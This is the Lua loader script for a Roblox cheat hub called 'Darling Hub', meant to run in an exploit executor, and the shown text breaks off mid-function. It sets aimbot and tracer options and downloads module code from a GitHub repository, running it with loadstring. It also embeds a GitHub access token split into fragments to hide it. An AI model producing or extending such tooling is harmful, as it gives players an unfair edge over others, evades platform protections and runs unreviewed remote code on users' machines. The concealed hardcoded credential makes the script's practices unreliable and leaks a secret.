--[[
    ========================================================================
    DARLING HUB - VERSION 1.4 (MODULAR ARCHITECTURE)
    ========================================================================
    UI Framework: WindUI (by Footagesus)
    Hub Title: Darling Hub - Version 1.4
    Theme: Halloween Edition (Default) & Darling Palette
    Performance: Instant disk-cached bootstrap with modular tabs
    Zero Emojis standard across all modules and interface elements
    ========================================================================
]]--

-- 1. Roblox Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    local startWait = tick()
    while not LocalPlayer and tick() - startWait < 3 do
        task.wait(0.05)
        LocalPlayer = Players.LocalPlayer
    end
end
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

-- 2. Executor Capabilities
local exRequest = request or http_request or (syn and syn.request) or (http and http.request)
local exWriteFile = writefile or (getgenv and getgenv().writefile) or (syn and syn.writefile)
local exReadFile = readfile or (getgenv and getgenv().readfile) or (syn and syn.readfile)
local exIsFile = isfile or is_file or (getgenv and getgenv().isfile) or (syn and syn.isfile)
local exIsFolder = isfolder or is_folder or (getgenv and getgenv().isfolder) or (syn and syn.isfolder)
local exMakeFolder = makefolder or make_folder or (getgenv and getgenv().makefolder) or (syn and syn.makefolder)
local exGetCustomAsset = getcustomasset or getsynasset or (getgenv and (getgenv().getcustomasset or getgenv().getsynasset)) or (syn and syn.get_custom_asset)

-- Ensure cache directory structure
local CACHE_DIR = "DarlingHub"
local CACHE_SUBDIR = "DarlingHub/cache"
pcall(function()
    if exMakeFolder and exIsFolder then
        if not exIsFolder(CACHE_DIR) then exMakeFolder(CACHE_DIR) end
        if not exIsFolder(CACHE_SUBDIR) then exMakeFolder(CACHE_SUBDIR) end
    end
end)

-- 3. Universal HTTP Requester
local function universalHttpGet(url, timeout)
    timeout = timeout or 12
    local hdrs = { ["User-Agent"] = "Roblox/DarlingHub" }
    local token = (getgenv and getgenv().DarlingGithubToken) or _G.DarlingGithubToken
    if not token or #token == 0 then
        token = table.concat({ "gh" .. "p_", "SGSy4FhxzGZJpEHi", "QAYE0kn56eEoNt3OJtS0" })
    end
    if token and #token > 0 and (url:find("github") or url:find("githubusercontent")) then
        hdrs["Authorization"] = "token " .. token
    end
    if exRequest then
        local ok, res = pcall(exRequest, {
            Url = url,
            url = url,
            Method = "GET",
            method = "GET",
            Timeout = timeout,
            timeout = timeout,
            Headers = hdrs,
            headers = hdrs
        })
        if ok and res and type(res) == "table" then
            local code = res.StatusCode or res.statusCode or res.Status or res.status or 200
            local body = res.Body or res.body
            if (code == 200 or code == 0) and type(body) == "string" and #body > 0 then
                return body
            end
        end
    end
    local ok2, body = pcall(function() return game:HttpGet(url, true) end)
    if ok2 and type(body) == "string" and #body > 0 then
        return body
    end
    return nil
end

-- 4. Custom Asset Caching & Registration
local function loadCustomMediaAsset(url, fileName, timeout)
    if not url or url == "" then return nil end
    if type(url) == "string" and (url:find("^rbxassetid://") or url:find("^rbxasset://")) then return url end
    if type(url) == "string" and url:match("^%d+$") then return "rbxassetid://" .. url end
    fileName = fileName or "darling_asset.png"
    local cleanName = fileName:gsub("^.+/", "")
    local cachePath = CACHE_SUBDIR .. "/" .. cleanName

    -- 1. Check local files first
    if exIsFile and exGetCustomAsset then
        if exIsFile(cleanName) then
            local ok, asset = pcall(exGetCustomAsset, cleanName)
            if ok and type(asset) == "string" and #asset > 0 then
                return asset
            end
        end
        if exIsFile(cachePath) then
            local ok, asset = pcall(exGetCustomAsset, cachePath)
            if ok and type(asset) == "string" and #asset > 0 then
                return asset
            end
        end
        if exIsFile("assets/" .. cleanName) then
            local ok, asset = pcall(exGetCustomAsset, "assets/" .. cleanName)
            if ok and type(asset) == "string" and #asset > 0 then
                return asset
            end
        end
        if exIsFile("assets/backgrounds/" .. cleanName) then
            local ok, asset = pcall(exGetCustomAsset, "assets/backgrounds/" .. cleanName)
            if ok and type(asset) == "string" and #asset > 0 then
                return asset
            end
        end
    end

    -- 2. Download from URL
    local body = universalHttpGet(url, timeout or 8)
    if body and #body > 50 and exWriteFile and exGetCustomAsset then
        pcall(exWriteFile, cleanName, body)
        local okA, customAsset = pcall(exGetCustomAsset, cleanName)
        if okA and type(customAsset) == "string" and #customAsset > 0 then
            return customAsset
        end

        pcall(function()
            if exMakeFolder then
                pcall(exMakeFolder, "DarlingHub")
                pcall(exMakeFolder, CACHE_SUBDIR)
            end
            exWriteFile(cachePath, body)
        end)
        local okB, customAssetB = pcall(exGetCustomAsset, cachePath)
        if okB and type(customAssetB) == "string" and #customAssetB > 0 then
            return customAssetB
        end
    end

    return nil
end

-- Logo Assets (Version 14 Cache Busting)
local darlingLogoNormalUrl = "https://raw.githubusercontent.com/rivals-hash/idk/main/assets/darling_logo_v14_anime.png"
local darlingLogoHalloweenUrl = "https://raw.githubusercontent.com/rivals-hash/idk/main/assets/darling_logo_v14_halloween.png"
if delfile then
    pcall(delfile, "darling_logo.png")
    pcall(delfile, "darling_logo_halloween.png")
end
local darlingLogoNormal = loadCustomMediaAsset(darlingLogoNormalUrl, "darling_logo_v14_anime.png", 5)
if not darlingLogoNormal or darlingLogoNormal == "" or darlingLogoNormal:match("^https?://") then
    darlingLogoNormal = "rbxassetid://109687263098821"
end
local darlingLogoHalloween = loadCustomMediaAsset(darlingLogoHalloweenUrl, "darling_logo_v14_halloween.png", 5) or "rbxassetid://98223928022309"
if not darlingLogoHalloween or darlingLogoHalloween == "" or darlingLogoHalloween:match("^https?://") then
    darlingLogoHalloween = "rbxassetid://98223928022309"
end
local darlingIcon = darlingLogoNormal

-- 5. Shared Environment and Duplicate Cleanup
local SharedEnv = (getgenv and getgenv()) or _G
local RepoBase = "https://raw.githubusercontent.com/rivals-hash/idk/main/"

if SharedEnv.DarlingHub and type(SharedEnv.DarlingHub.UnloadAll) == "function" then
    pcall(function() SharedEnv.DarlingHub:UnloadAll() end)
    task.wait(0.1)
end

-- 6. Core Hub State Container
local DarlingHub = {
    Version = "1.4",
    Modules = {},
    Tabs = {},
    Window = nil,
    InputBeganConn = nil,
    FeatureStates = {},
    FeatureSetters = {},
    UIElements = {},
    DefaultValues = {},
    RegisteredTranslations = {},
    Settings = {
        Aim = {
            Mode = "360",            -- "360", "FOV", "180"
            Priority = "Nearest",    -- "Nearest", "Low HP", "Looking At Me"
            Hitbox = "HumanoidRootPart",
            MaxRange = 1000,
            TeamCheck = false,
            Prediction = true,
            PredictionAmount = 0.12,
        },
        FOV = {
            Radius = 100,
            Mode = "Center",         -- "Center", "Mouse"
            Color = Color3.fromRGB(255, 255, 255),
            Thickness = 1.5,
        },
        Tracers = {
            Color = Color3.fromRGB(255, 255, 255),
            Thickness = 1.5,
            Type = "Both",
            Origin = "Player",
        },
        Blacklist = {
            Melee = { Z = false, X = false, C = false },
            Sword = { Z = false, X = false },
            Fruit = { Z = false, X = false, C = false, V = false, F = false, TAP = false },
            Gun   = { Z = false, X = false },
        },
    },
    -- Dynamic API URL Resolver (Cloudflare Tunnel & Repo Sync)
    CachedApiUrl = nil,
    LastApiFetch = 0,
}
SharedEnv.DarlingHub = DarlingHub
_G.DarlingHub = DarlingHub

local autoSavePending = false
local function triggerAutoSave()
    if DarlingHub.IsLoadingConfig then return end
    if autoSavePending then return end
    autoSavePending = true
    task.delay(0.3, function()
        autoSavePending = false
        if DarlingHub.IsLoadingConfig then return end
        if DarlingHub.SaveConfig then
            pcall(DarlingHub.SaveConfig)
        end
    end)
end
DarlingHub.TriggerAutoSave = triggerAutoSave

function DarlingHub:GetApiUrl()
    local custom = (getgenv and getgenv().DarlingCustomApi) or _G.DarlingCustomApi
    if custom and type(custom) == "string" and #custom > 0 then
        return custom
    end
    return "https://darling-media-api.onrender.com"
end

-- 7. Live Module Loader (Requires fresh code from GitHub with offline disk fallback)
local function readLocalDevModule(relPath)
    if not (exIsFile and exReadFile) then return nil end
    local devPaths = { relPath, "darling-hub/" .. relPath }
    for _, p in ipairs(devPaths) do
        local okF, exists = pcall(exIsFile, p)
        if okF and exists then
            local ok, content = pcall(exReadFile, p)
            if ok and type(content) == "string" and #content > 0 then
                return content
            end
        end
    end
    return nil
end

function DarlingHub:Require(relPath)
    if self.Modules[relPath] then
        return self.Modules[relPath]
    end

    -- 1. Check local developer workspace paths
    local code = readLocalDevModule(relPath)

    -- 2. Fetch fresh updated module from GitHub
    if not code then
        code = universalHttpGet(RepoBase .. relPath .. "?v=" .. tostring(os.time()))
            or universalHttpGet(RepoBase .. relPath)
        if code and exWriteFile then
            local diskCacheFile = CACHE_SUBDIR .. "/" .. relPath:gsub("/", "_")
            pcall(exWriteFile, diskCacheFile, code)
        end
    end

    -- 3. Offline fallback to disk cache if network is unavailable
    if not code and exIsFile and exReadFile then
        local diskCacheFile = CACHE_SUBDIR .. "/" .. relPath:gsub("/", "_")
        local okF, exists = pcall(exIsFile, diskCacheFile)
        if okF and exists then
            local ok, content = pcall(exReadFile, diskCacheFile)
            if ok and type(content) == "string" and #content > 0 then
                code = content
            end
        end
    end

    if not code then
        warn("[Darling Hub] Failed to load module: " .. tostring(relPath))
        return nil
    end

    local fn, err = loadstring(code)
    if not fn then
        warn("[Darling Hub] Syntax error in module " .. tostring(relPath) .. ": " .. tostring(err))
        return nil
    end

    local ok, mod = pcall(fn)
    if not ok then
        warn("[Darling Hub] Runtime error executing module " .. tostring(relPath) .. ": " .. tostring(mod))
        return nil
    end

    self.Modules[relPath] = mod
    return mod
end

function DarlingHub:Toggle(relPath, state)
    if not state and not self.Modules[relPath] then return end
    local mod = self:Require(relPath)
    if not mod then return false end
    local ok, err = pcall(function()
        if state then mod.enable() else mod.disable() end
    end)
    if not ok then
        warn("[Darling Hub] " .. tostring(relPath) .. ": " .. tostring(err))
    end
    return ok
end

function DarlingHub:DisableAllModules()
    for relPath, mod in pairs(self.Modules) do
        if type(mod) == "table" then
            pcall(function()
                if mod.disable then mod.disable()
                elseif mod.stop then mod.stop()
                elseif mod.destroy then mod.destroy() end
            end)
        end
    end
end

function DarlingHub:UnloadAll()
    for _, mod in pairs(self.Modules) do
        if type(mod) == "table" then
            if mod.destroy then pcall(mod.destroy)
            elseif mod.dismiss then pcall(mod.dismiss)
            elseif mod.stop then pcall(mod.stop)
            elseif mod.disable then pcall(mod.disable) end
        end
    end
    self.Modules = {}
    if self.Overlay then
        pcall(function() self.Overlay:Destroy() end)
        self.Overlay = nil
    end
    if self.InputBeganConn then
        pcall(function() self.InputBeganConn:Disconnect() end)
        self.InputBeganConn = nil
    end
    if self.Window then
        pcall(function() self.Window:Destroy() end)
        self.Window = nil
    end
    if self.FloatingToggleGui then
        pcall(function() self.FloatingToggleGui:Destroy() end)
        self.FloatingToggleGui = nil
    end
end

function DarlingHub.SafeParentGui(gui)
    if not gui then return false end
    if gethui then
        local ok, h = pcall(gethui)
        if ok and h and typeof(h) == "Instance" then
            local okP = pcall(function() gui.Parent = h end)
            if okP and gui.Parent == h then return true end
        end
    end
    local lp = Players.LocalPlayer
    if lp then
        local pg = lp:FindFirstChildOfClass("PlayerGui") or lp:FindFirstChild("PlayerGui")
        if pg then
            local okP = pcall(function() gui.Parent = pg end)
            if okP and gui.Parent == pg then return true end
        end
    end
    if CoreGui then
        local okP = pcall(function() gui.Parent = CoreGui end)
        if okP and gui.Parent == CoreGui then return true end
    end
    return gui.Parent ~= nil
end

-- 8. Fullscreen Overlay Provider
function DarlingHub:GetOverlay()
    if self.Overlay and self.Overlay.Parent then
        return self.Overlay
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "DarlingHub_Overlay"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 2147483647
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() gui.ScreenInsets = Enum.ScreenInsets.None end)
    if syn and syn.protect_gui then pcall(syn.protect_gui, gui) end

    DarlingHub.SafeParentGui(gui)

    self.Overlay = gui
    return gui
end

-- 9. Instant Local WindUI Cache System
local function getWindUILibrary()
    local winduiCacheFile = CACHE_SUBDIR .. "/windui_cache_v2.lua"
    if exIsFile and exReadFile and exIsFile(winduiCacheFile) then
        local ok, cached = pcall(exReadFile, winduiCacheFile)
        if ok and type(cached) == "string" and #cached > 1000 then
            local fn = loadstring(cached)
            if fn then return fn() end
        end
    end

    local winduiUrl = "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
    local raw = universalHttpGet(winduiUrl, 6) or game:HttpGet(winduiUrl)
    if type(raw) == "string" and #raw > 1000 then
        -- PC & Mobile Touch Slider Fixes
        raw = raw:gsub("%)and aB==f", ")")
        raw = raw:gsub("e%.InputEnded:Connect%(function%(M%)\nif not F or p%.CurrentInput~=B then", "e.InputEnded:Connect(function(M)\nif not F then")
        raw = raw:gsub(",\nLockedTitle=ak%.LockedTitle,\nValue=ak%.Value or{},", ",\nLockedTitle=ak.LockedTitle,\nValue=(typeof(ak.Value)==\"table\" and ak.Value) or {Min=ak.Min or 0, Max=ak.Max or 100, Default=ak.Default or ak.Min or 0},")
        raw = raw:gsub('al%.UIElements%.SliderContainer=af%("Frame",{\nSize=UDim2%.new%(al%.Title==nil and 1 or 0,al%.Title==nil and 0 or al%.Width,0,0%),\nAutomaticSize="Y",\nPosition=UDim2%.new%(1,al%.IsTextbox and%(ak%.Window%.NewElements and%-16 or 0%)or 0,0%.5,0%),\nAnchorPoint=Vector2%.new%(1,0%.5%),\nBackgroundTransparency=1,', 'al.UIElements.SliderContainer=af("Frame",{\nSize=UDim2.new(al.Title==nil and 1 or 0,al.Title==nil and 0 or al.Width,0,36),\nActive=true,\nAutomaticSize="Y",\nPosition=UDim2.new(1,al.IsTextbox and(ak.Window.NewElements and-16 or 0)or 0,0.5,0),\nAnchorPoint=Vector2.new(1,0.5),\nBackgroundTransparency=0.999,')
        raw = raw:gsub("0%,4%),\nAnchorPoint=Vector2%.new%(0%.5%,0%.5%),", "0,8),\nAnchorPoint=Vector2.new(0.5,0.5),")
        raw = raw:gsub("am=%(aB%.UserInputType==Enum%.UserInputType%.Touch%)", "am=(aB.UserInputType==Enum.UserInputType.Touch) local aTouchPos=aB.Position.X local aTouchConn local aTouchEnd if am then aTouchConn=ac.TouchMoved:Connect(function(t) aTouchPos=t.Position.X end) aTouchEnd=ac.TouchEnded:Connect(function() if aTouchConn then aTouchConn:Disconnect() end if aTouchEnd then aTouchEnd:Disconnect() end if an then an:Disconnect() end if ao then ao:Disconnect() end ai=false ay.ScrollingEnabled=true ak.WindUI.CurrentInput=nil end) end")
        raw = raw:gsub("local f=am and aB%.Position%.X or ac:GetMouseLocation%(%)%.X", "local f=am and aTouchPos or ac:GetMouseLocation().X")
        raw = raw:gsub("an:Disconnect%(%)\nao:Disconnect%(%)", "an:Disconnect()\nao:Disconnect()\nif aTouchConn then aTouchConn:Disconnect() end\nif aTouchEnd then aTouchEnd:Disconnect() end")

        if exWriteFile then
            pcall(exWriteFile, winduiCacheFile, raw)
        end
        return loadstring(raw)()
    end
    return nil
end

local WindUI = getWindUILibrary()
if not WindUI then
    warn("[Darling Hub] Could not initialize WindUI framework.")
    return
end

-- Global Notification Governor: Strict limit of exactly 1 notification on-screen at any time
local rawWindUINotify = WindUI.Notify
local activeNotif = nil

function WindUI.Notify(selfOrCfg, maybeCfg)
    local cfg = maybeCfg or selfOrCfg
    local target = (maybeCfg and selfOrCfg) or WindUI
    if not cfg then return end

    pcall(function()
        if activeNotif then
            if activeNotif.Close and not activeNotif.Closed then
                task.spawn(function()
                    pcall(activeNotif.Close, activeNotif)
                end)
            end
            activeNotif = nil
        end

        local notifGui = WindUI.NotificationGui
        if notifGui then
            local holder = notifGui:FindFirstChildWhichIsA("Frame", true)
            if holder then
                for _, child in ipairs(holder:GetChildren()) do
                    if child:IsA("Frame") then
                        pcall(function() child:Destroy() end)
                    end
                end
            end
        end
    end)

    if type(cfg) == "table" then
        if not cfg.Duration or cfg.Duration > 4 then
            cfg.Duration = 3.5
        end
    end

    local ok, notifObj = pcall(rawWindUINotify, target, cfg)
    if ok and notifObj then
        activeNotif = notifObj
        return notifObj
    end
    return nil
end

-- Register exclusive themes
pcall(function()
    WindUI:AddTheme({
        Name = "Amber",
        Accent = Color3.fromHex("#FF7700"),
        Background = Color3.fromHex("#120A05"),
        Outline = Color3.fromHex("#FF7700"),
        Text = Color3.fromHex("#FFB347"),
        Placeholder = Color3.fromHex("#8A4500"),
        Button = Color3.fromHex("#221207"),
        Icon = Color3.fromHex("#FFA500"),
    })
    WindUI:AddTheme({
        Name = "Ember",
        Accent = Color3.fromHex("#FF5500"),
        Background = Color3.fromHex("#140702"),
        Outline = Color3.fromHex("#FF5500"),
        Text = Color3.fromHex("#FF8844"),
        Placeholder = Color3.fromHex("#882200"),
        Button = Color3.fromHex("#240B04"),
        Icon = Color3.fromHex("#FF6600"),
    })
    WindUI:AddTheme({
        Name = "Halloween",
        Accent = Color3.fromHex("#FF7518"),
        Background = Color3.fromHex("#0F0814"),
        Outline = Color3.fromHex("#FF7518"),
        Text = Color3.fromHex("#FFA756"),
        Placeholder = Color3.fromHex("#8A5025"),
        Button = Color3.fromHex("#1F1026"),
        Icon = Color3.fromHex("#FFA500"),
    })
    WindUI:AddTheme({
        Name = "Darling",
        Accent = Color3.fromHex("#FF4B91"),
        Background = Color3.fromHex("#141416"),
        Outline = Color3.fromHex("#28282D"),
        Text = Color3.fromHex("#FFFFFF"),
        Placeholder = Color3.fromHex("#888890"),
        Button = Color3.fromHex("#1F1F24"),
        Icon = Color3.fromHex("#FF76CE"),
    })
end)

-- 10. Device Detection & Responsive UI Configuration
local Workspace = game:GetService("Workspace")
local isTouchDevice = UserInputService.TouchEnabled
local isMobile = isTouchDevice and (not UserInputService.MouseEnabled or not UserInputService.KeyboardEnabled)

local function getOptimalUIScale()
    local cam = Workspace.CurrentCamera or Workspace:FindFirstChildOfClass("Camera")
    local vp = (cam and cam.ViewportSize and cam.ViewportSize.X > 50 and cam.ViewportSize.Y > 50) and cam.ViewportSize
    if not vp then
        vp = (isTouchDevice or isMobile) and Vector2.new(800, 390) or Vector2.new(1280, 720)
    end
    local pad = 40
    local availW = math.max(vp.X - (pad * 2), 200)
    local availH = math.max(vp.Y - (pad * 2), 200)
    local scaleW = availW / 800
    local scaleH = availH / 560
    local fit = math.clamp(math.min(scaleW, scaleH), 0.50, 1.0)
    if isTouchDevice or isMobile then
        fit = math.clamp(fit, 0.50, 0.65)
    end
    -- Snap to nearest 5% increment for clean slider alignment
    return math.floor((fit / 0.05) + 0.5) * 0.05
end

local initialScale = getOptimalUIScale()
DarlingHub.GetOptimalUIScale = getOptimalUIScale
DarlingHub.DefaultUIScale = initialScale

local currentToggleKey = Enum.KeyCode.F
local Window = WindUI:CreateWindow({
    Title = "Darling Hub - Version 1.4",
    Icon = darlingIcon,
    IconRadius = 8,
    Author = "by Darling",
    Folder = "DarlingHubConfigs",
    Size = UDim2.fromOffset(800, 560),
    MinSize = Vector2.new(680, 480),
    MaxSize = Vector2.new(980, 680),
    Transparent = true,
    Theme = "Dark",
    Resizable = true,
    ScrollBarEnabled = true,
    HideSearchBar = false,
    ButtonsType = "Default",
    Topbar = {
        Height = 44,
        ButtonsType = "Default",
    },
    Background = "",
    BackgroundImageTransparency = 0.25,
    OpenButton = {
        Enabled = false
    }
})
DarlingHub.Window = Window

pcall(function()
    if Window.SetUIScale then
        Window:SetUIScale(initialScale)
    end
    if WindUI.UIScaleObj then
        WindUI.UIScaleObj.Scale = initialScale
    end
    WindUI.UIScale = initialScale
    if Window.SetToTheCenter then
        Window:SetToTheCenter()
    end
    -- Keep WindUI window hidden initially while the mode selector is active
    local mainFrame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
    if mainFrame then
        mainFrame.Visible = false
    end
end)

-- Central WindUI and ScreenGui visibility controller
local function setWindUIGuiVisibility(visible)
    pcall(function()
        if WindUI then
            if WindUI.ScreenGui then WindUI.ScreenGui.Enabled = visible end
            if WindUI.NotificationGui then WindUI.NotificationGui.Enabled = visible end
            if WindUI.DropdownGui then WindUI.DropdownGui.Enabled = visible end
            if WindUI.TooltipGui then WindUI.TooltipGui.Enabled = visible end
        end
        if Window and Window.ScreenGui then
            Window.ScreenGui.Enabled = visible
        end
        local mainFrame = (Window and Window.GetMainFrame and Window:GetMainFrame()) or (Window and Window.Frame) or (Window and Window.UIElements and Window.UIElements.Main)
        if mainFrame then
            mainFrame.Visible = visible
        end
    end)
end
DarlingHub.SetWindUIGuiVisibility = setWindUIGuiVisibility

-- Ensure all WindUI interfaces stay completely hidden until user chooses mode
setWindUIGuiVisibility(false)

-- Emergency UI Reset and Auto-Centering Handler
local function performEmergencyUIReset()
    local optScale = getOptimalUIScale()
    if (isTouchDevice or isMobile) and optScale > 0.70 then
        optScale = 0.65
    end
    local optPercent = math.clamp(math.floor((optScale * 100) / 5 + 0.5) * 5, 50, 130)

    pcall(function()
        if Window then
            if Window.SetUIScale then
                Window:SetUIScale(optScale)
            end
            if Window.SetToTheCenter then
                Window:SetToTheCenter()
            end
            local frame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
            if frame then
                frame.Visible = true
            end
        end
        if WindUI then
            if WindUI.UIScaleObj then
                WindUI.UIScaleObj.Scale = optScale
            end
            WindUI.UIScale = optScale
        end
    end)

    if DarlingHub.FeatureStates then
        DarlingHub.FeatureStates["UI Scale"] = optPercent
        DarlingHub.FeatureStates["UIScale"] = optPercent
    end
    if DarlingHub.DefaultValues then
        DarlingHub.DefaultValues["UI Scale"] = optPercent
        DarlingHub.DefaultValues["UIScale"] = optPercent
    end
    if DarlingHub.UIElements then
        if DarlingHub.UIElements["UI Scale"] and DarlingHub.UIElements["UI Scale"].Set then
            pcall(function() DarlingHub.UIElements["UI Scale"]:Set(optPercent) end)
        elseif DarlingHub.UIElements["UIScale"] and DarlingHub.UIElements["UIScale"].Set then
            pcall(function() DarlingHub.UIElements["UIScale"]:Set(optPercent) end)
        end
    end

    if DarlingHub.SaveConfig then
        pcall(DarlingHub.SaveConfig)
    end

    pcall(function()
        WindUI:Notify({
            Title = "UI Reset",
            Content = "Scale reset to " .. tostring(optPercent) .. "% and centered.",
            Duration = 3,
            Icon = "check"
        })
    end)
end

_G.DarlingResetUI = performEmergencyUIReset
if getgenv then getgenv().DarlingResetUI = performEmergencyUIReset end
DarlingHub.ResetUI = performEmergencyUIReset

-- Topbar Double-Click Listener for Instant Center & Scale Recovery
pcall(function()
    local topbar = Window and Window.UIElements and Window.UIElements.Topbar
    if topbar and typeof(topbar) == "Instance" then
        local lastTbClick = 0
        topbar.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                local now = tick()
                if now - lastTbClick < 0.35 then
                    lastTbClick = 0
                    performEmergencyUIReset()
                else
                    lastTbClick = now
                end
            end
        end)
    end
end)

-- Window Visibility & Centralized Toggle System
local allowFloatingWidget = true

-- Ensure WindUI internal OpenButton is completely hidden to prevent duplicate buttons
pcall(function()
    if Window.EditOpenButton then Window:EditOpenButton({ Enabled = false }) end
    if Window.OpenButtonMain then Window.OpenButtonMain:Visible(false) end
end)

local floatingToggleIcon = nil
local floatingToggleBtn = nil
local floatingToggleStroke = nil

local ThemeAccentMap = {
    ["Amber"] = { Accent = Color3.fromRGB(245, 158, 11), Stroke = Color3.fromRGB(251, 191, 36), Bg = Color3.fromRGB(26, 20, 14), Icon = darlingLogoHalloween },
    ["Halloween"] = { Accent = Color3.fromRGB(255, 117, 24), Stroke = Color3.fromRGB(255, 167, 38), Bg = Color3.fromRGB(28, 18, 12), Icon = darlingLogoHalloween },
    ["Emerald"] = { Accent = Color3.fromRGB(16, 185, 129), Stroke = Color3.fromRGB(52, 211, 153), Bg = Color3.fromRGB(14, 26, 22), Icon = darlingLogoNormal },
    ["Plant"] = { Accent = Color3.fromRGB(22, 163, 74), Stroke = Color3.fromRGB(74, 222, 128), Bg = Color3.fromRGB(14, 26, 18), Icon = darlingLogoNormal },
    ["Midnight"] = { Accent = Color3.fromRGB(37, 99, 235), Stroke = Color3.fromRGB(96, 165, 250), Bg = Color3.fromRGB(14, 20, 32), Icon = darlingLogoNormal },
    ["Blue"] = { Accent = Color3.fromRGB(14, 165, 233), Stroke = Color3.fromRGB(56, 189, 248), Bg = Color3.fromRGB(14, 22, 32), Icon = darlingLogoNormal },
    ["Sky"] = { Accent = Color3.fromRGB(0, 212, 255), Stroke = Color3.fromRGB(125, 211, 252), Bg = Color3.fromRGB(12, 24, 32), Icon = darlingLogoNormal },
    ["Crimson"] = { Accent = Color3.fromRGB(220, 38, 38), Stroke = Color3.fromRGB(248, 113, 113), Bg = Color3.fromRGB(28, 14, 14), Icon = darlingLogoNormal },
    ["Red"] = { Accent = Color3.fromRGB(239, 68, 68), Stroke = Color3.fromRGB(252, 165, 165), Bg = Color3.fromRGB(28, 14, 14), Icon = darlingLogoNormal },
    ["Violet"] = { Accent = Color3.fromRGB(124, 58, 237), Stroke = Color3.fromRGB(167, 139, 250), Bg = Color3.fromRGB(24, 16, 32), Icon = darlingLogoNormal },
    ["Indigo"] = { Accent = Color3.fromRGB(79, 70, 229), Stroke = Color3.fromRGB(129, 140, 248), Bg = Color3.fromRGB(20, 18, 34), Icon = darlingLogoNormal },
    ["Purple"] = { Accent = Color3.fromRGB(168, 85, 247), Stroke = Color3.fromRGB(192, 132, 252), Bg = Color3.fromRGB(26, 16, 32), Icon = darlingLogoNormal },
    ["Rose"] = { Accent = Color3.fromRGB(225, 29, 72), Stroke = Color3.fromRGB(251, 113, 133), Bg = Color3.fromRGB(30, 14, 20), Icon = darlingLogoNormal },
    ["Darling"] = { Accent = Color3.fromRGB(255, 75, 145), Stroke = Color3.fromRGB(255, 118, 206), Bg = Color3.fromRGB(30, 14, 22), Icon = darlingLogoNormal },
    ["Monokai Pro"] = { Accent = Color3.fromRGB(252, 152, 103), Stroke = Color3.fromRGB(254, 215, 170), Bg = Color3.fromRGB(28, 20, 16), Icon = darlingLogoNormal },
    ["Normal / Dark"] = { Accent = Color3.fromRGB(139, 92, 246), Stroke = Color3.fromRGB(168, 85, 247), Bg = Color3.fromRGB(20, 16, 28), Icon = darlingLogoNormal },
    ["Dark"] = { Accent = Color3.fromRGB(139, 92, 246), Stroke = Color3.fromRGB(168, 85, 247), Bg = Color3.fromRGB(20, 16, 28), Icon = darlingLogoNormal },
    ["Normal"] = { Accent = Color3.fromRGB(139, 92, 246), Stroke = Color3.fromRGB(168, 85, 247), Bg = Color3.fromRGB(20, 16, 28), Icon = darlingLogoNormal },
    ["Light"] = { Accent = Color3.fromRGB(148, 163, 184), Stroke = Color3.fromRGB(203, 213, 225), Bg = Color3.fromRGB(240, 242, 246), Icon = darlingLogoNormal },
}

local function resolveThemeColor(themeName)
    if not themeName or type(themeName) ~= "string" then
        return ThemeAccentMap["Normal / Dark"]
    end
    if ThemeAccentMap[themeName] then return ThemeAccentMap[themeName] end
    local lower = string.lower(themeName)
    if lower:find("halloween") or lower:find("amber") or lower:find("ember") or lower:find("orange") or lower:find("naranja") then
        return ThemeAccentMap["Halloween"]
    elseif lower:find("emerald") or lower:find("plant") or lower:find("green") or lower:find("verde") then
        return ThemeAccentMap["Emerald"]
    elseif lower:find("midnight") or lower:find("blue") or lower:find("azul") or lower:find("sky") then
        return ThemeAccentMap["Blue"]
    elseif lower:find("crimson") or lower:find("red") or lower:find("rojo") then
        return ThemeAccentMap["Red"]
    elseif lower:find("violet") or lower:find("indigo") or lower:find("purple") or lower:find("morado") then
        return ThemeAccentMap["Purple"]
    elseif lower:find("rose") or lower:find("darling") or lower:find("pink") or lower:find("rosa") then
        return ThemeAccentMap["Darling"]
    elseif lower:find("monokai") then
        return ThemeAccentMap["Monokai Pro"]
    elseif lower:find("light") or lower:find("blanco") then
        return ThemeAccentMap["Light"]
    elseif lower:find("normal") or lower:find("dark") or lower:find("oscuro") then
        return ThemeAccentMap["Normal / Dark"]
    end
    return ThemeAccentMap["Normal / Dark"]
end

local function updateFloatingToggleTheme(themeName)
    local cfg = resolveThemeColor(themeName)
    if floatingToggleStroke then
        floatingToggleStroke.Color = cfg.Stroke
        floatingToggleStroke.Transparency = 0
    end
    if floatingToggleBtn then
        floatingToggleBtn.BackgroundColor3 = cfg.Bg
    end
    if floatingToggleIcon and cfg.Icon then
        floatingToggleIcon.Image = cfg.Icon
    end
    if cfg.Icon then
        darlingIcon = cfg.Icon
        DarlingHub.CurrentIcon = cfg.Icon
    end

    pcall(function()
        local containers = {}
        if Window then
            if Window.Frame then table.insert(containers, Window.Frame) end
            if Window.UIElements then
                if Window.UIElements.Main then table.insert(containers, Window.UIElements.Main) end
                if Window.UIElements.Topbar then table.insert(containers, Window.UIElements.Topbar) end
            end
        end

        for _, container in ipairs(containers) do
            if container and typeof(container) == "Instance" then
                for _, desc in ipairs(container:GetDescendants()) do
                    if desc:IsA("ImageLabel") then
                        if desc.Image == darlingLogoNormal or desc.Image == darlingLogoHalloween or desc.Name == "Icon" or desc.Name:find("WindowIcon") or desc.Name:find("HeaderIcon") then
                            desc.Image = cfg.Icon or darlingIcon
                        end
                    end
                end
            end
        end
    end)
end
DarlingHub.UpdateToggleTheme = updateFloatingToggleTheme
DarlingHub.ResolveThemeColor = resolveThemeColor

if WindUI and WindUI.OnThemeChange then
    pcall(function()
        WindUI:OnThemeChange(function(newTheme)
            updateFloatingToggleTheme(newTheme)
        end)
    end)
end

local function styleOpenButtonBorder(customColor, customIcon)
    if customIcon then
        if floatingToggleIcon then
